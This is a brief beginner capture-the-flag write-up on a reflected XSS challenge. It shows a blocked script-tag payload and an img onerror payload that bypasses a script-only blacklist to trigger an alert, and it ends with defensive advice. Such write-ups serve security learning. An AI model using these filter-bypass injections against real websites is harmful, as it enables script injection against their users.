# First Bounty H1

---

Welcome to my first CTF writeup! 🎉  
In this challenge, I solved a basic **Web Exploitation** problem involving XSS and CSRF protection.

---

## 🧩 Challenge Summary

**Name:** Simple XSS  
**Category:** Web  
**Points:** 100  
**Description:**  
> Can you bypass the input filter and alert the admin?

---

## 🔍 Recon

The web app takes user input and reflects it on the page:

```html
Welcome, <span id="name">USERNAME</span>
Testing with some basic payloads:
```

```javascript
"><script>alert(1)</script>
This was filtered — but the filter was only blacklisting <script>.
```

## 🚨 Exploit
By using an event-based injection:

```html
<img src=x onerror=alert(1)>
It bypassed the blacklist and triggered the alert. ✅
```

## 🛡️ Prevention
To fix this, the server should:

Use proper output encoding (e.g., DOMPurify)

Avoid reflecting user input into HTML without escaping

Use CSP headers

## 📝 Final Thoughts
A nice beginner web challenge. XSS remains one of the most underestimated but powerful vulnerabilities.

Thanks for reading!
More writeups coming soon — stay tuned.

